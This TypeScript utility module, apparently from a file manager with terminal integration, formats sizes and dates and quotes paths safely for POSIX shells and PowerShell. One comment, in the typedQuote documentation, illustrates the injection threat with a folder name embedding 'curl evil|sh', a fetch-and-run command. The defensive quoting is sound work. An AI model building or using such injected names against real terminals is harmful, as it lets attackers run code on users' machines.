import { isWindows } from "./keys";
import { type TargetRef } from "./types";

const UNITS = ["B", "KB", "MB", "GB", "TB", "PB"];

/** 1536 -> "1.5 KB". One decimal under 10, none above. */
export function bytes(n: number): string {
  if (!Number.isFinite(n) || n <= 0) return "0 B";
  let i = Math.min(Math.floor(Math.log(n) / Math.log(1024)), UNITS.length - 1);
  // "1020 KB" reads worse than "1.0 MB".
  if (n / 1024 ** i >= 1000 && i < UNITS.length - 1) i++;
  const v = n / 1024 ** i;
  return `${v < 10 && i > 0 ? v.toFixed(1) : Math.round(v)} ${UNITS[i]}`;
}

export function rate(bytesPerSec: number): string {
  return `${bytes(bytesPerSec)}/s`;
}

export function percent(fraction: number): string {
  return `${Math.round(Math.max(0, Math.min(1, fraction)) * 100)}%`;
}

export function uptime(secs: number): string {
  const d = Math.floor(secs / 86400);
  const h = Math.floor((secs % 86400) / 3600);
  const m = Math.floor((secs % 3600) / 60);
  if (d > 0) return `${d}d ${h}h`;
  if (h > 0) return `${h}h ${m}m`;
  return `${m}m`;
}

// Made once: a folder of a thousand files formats a thousand dates, and
// toLocaleTimeString with options builds a new formatter every call.
const TIME = new Intl.DateTimeFormat(undefined, { hour: "2-digit", minute: "2-digit" });
const DAY = new Intl.DateTimeFormat(undefined, { month: "short", day: "numeric" });
const DAY_IN_YEAR = new Intl.DateTimeFormat(undefined, { month: "short", day: "numeric", year: "numeric" });

const sameDay = (a: Date, b: Date) => a.getDate() === b.getDate() && a.getMonth() === b.getMonth() && a.getFullYear() === b.getFullYear();

/** Finder-style dates: "Just now", "12 min ago", "Today 14:02", "Oct 12", "Oct 12, 2023". */
export function modified(unixSecs: number): string {
  if (!unixSecs) return "—";
  const d = new Date(unixSecs * 1000);
  const diff = (Date.now() - d.getTime()) / 1000;
  if (diff < 60) return "Just now";
  if (diff < 3600) return `${Math.floor(diff / 60)} min ago`;
  const today = new Date();
  if (sameDay(d, today)) return `Today ${TIME.format(d)}`;
  const yesterday = new Date(today);
  yesterday.setDate(today.getDate() - 1);
  if (sameDay(d, yesterday)) return `Yesterday ${TIME.format(d)}`;
  return (d.getFullYear() === today.getFullYear() ? DAY : DAY_IN_YEAR).format(d);
}

export function monthName(yyyyMm: string): string {
  const [y, m] = yyyyMm.split("-").map(Number);
  if (!y || !m) return yyyyMm;
  return new Date(y, m - 1, 1).toLocaleDateString(undefined, { month: "long" });
}

export function joinPath(dir: string, name: string): string {
  return dir.endsWith("/") ? `${dir}${name}` : `${dir}/${name}`;
}

export function parentPath(path: string): string {
  const p = path.replace(/\/+$/, "");
  const i = p.lastIndexOf("/");
  return i <= 0 ? "/" : p.slice(0, i);
}

export function shellQuote(s: string): string {
  return `'${s.replace(/'/g, `'\\''`)}'`;
}

/** What reads the text typed into a terminal. */
export type Shell = "posix" | "powershell";

/** This computer's terminal on Windows is PowerShell (the backend starts powershell.exe); everything else is sh-like. */
export function shellOf(target: TargetRef): Shell {
  return target.kind === "local" && isWindows ? "powershell" : "posix";
}

/**
 * `s` quoted for typing into a terminal, or null if it holds a control
 * character. A terminal takes those as keys before the shell sees any
 * quotes, so a folder named "a<Ctrl+U>curl evil|sh<Enter>" would run that.
 *
 * The quoting has to hold in whatever shell is there: `'` and `\` go outside
 * the quotes, escaped, since fish reads `\'` inside them as a quote. In
 * PowerShell `‘’‚‛` close a string as `'` does, and each is escaped by
 * doubling it.
 */
export function typedQuote(s: string, shell: Shell): string | null {
  if (/[\x00-\x1f\x7f-\x9f]/.test(s)) return null;
  if (shell === "powershell") return `'${s.replace(/['‘’‚‛]/g, "$&$&")}'`;
  return s.replace(/[^'\\]+|['\\]/g, (m) => (m === "'" || m === "\\" ? `\\${m}` : `'${m}'`)) || "''";
}

/**
 * Text to paste into a terminal, without the control characters it would act
 * on as keys: Esc could end the shell's paste guard (bracketed paste) early,
 * Ctrl+U wipe the line, and a lone CR press Enter. Tabs and line breaks stay.
 */
export function withoutKeys(text: string): string {
  return text.replace(/\r\n?/g, "\n").replace(/[\x00-\x08\x0b-\x1f\x7f-\x9f]/g, "");
}

/**
 * Typed into `shell`: go into `dir`, then run `next` if that worked. Null
 * when `dir` can't be typed (see `typedQuote`). Windows PowerShell 5.1 has
 * no `&&`, and -LiteralPath keeps `[` `]` in a path from acting as wildcards.
 */
export function typedCd(dir: string, shell: Shell, next?: string): string | null {
  const quoted = typedQuote(dir, shell);
  if (quoted === null) return null;
  if (shell === "powershell") return next ? `Set-Location -LiteralPath ${quoted}; if ($?) { ${next} }` : `Set-Location -LiteralPath ${quoted}`;
  return next ? `cd -- ${quoted} && ${next}` : `cd -- ${quoted}`;
}

export function cn(...parts: (string | false | null | undefined)[]): string {
  return parts.filter(Boolean).join(" ");
}

/** How long ago a moment (in ms) was: "just now", "12 min ago", "3 h ago", "2 d ago". */
export function ago(at: number): string {
  const min = Math.floor((Date.now() - at) / 60000);
  if (min < 1) return "just now";
  if (min < 60) return `${min} min ago`;
  const h = Math.floor(min / 60);
  return h < 24 ? `${h} h ago` : `${Math.floor(h / 24)} d ago`;
}
